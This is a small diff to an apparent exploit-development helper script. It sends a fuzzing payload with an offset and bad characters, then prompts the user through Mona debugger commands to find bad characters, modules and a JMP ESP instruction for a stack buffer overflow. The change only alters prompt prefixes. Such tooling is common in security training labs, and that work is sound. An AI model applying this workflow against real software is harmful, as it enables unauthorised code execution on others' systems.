@@ -53,13 +53,13 @@ class Enum:
         fuzz.send_payload("A" * offset + "B" * 4 + bad_characters())
 
         bad_char_esp = input(f"[?] Enter start ESP of bad characters: ")
-        print('\n[?] Run: !mona bytearray -b "\\x00"\n')
-        print(f"[?] Run: '!mona compare -f bytearray.bin -a {bad_char_esp}'\n")
+        print('\n[-] Run: !mona bytearray -b "\\x00"\n')
+        print(f"[-] Run: '!mona compare -f bytearray.bin -a {bad_char_esp}'\n")
 
-        print(f"[?] Run: '!mona modules'\n")
-        dll = input("Enter target DLL: ")
+        print(f"[-] Run: '!mona modules'\n")
+        dll = input("[?] Enter target DLL: ")
 
-        print(f"\n[?] Run: '!mona find -s '\\xff\\xe4' -m {dll}'\n")
+        print(f"\n[-] Run: '!mona find -s '\\xff\\xe4' -m {dll}'\n")
 
         dll_mem = input("[?] Enter target DLL Memory Location: ")
 
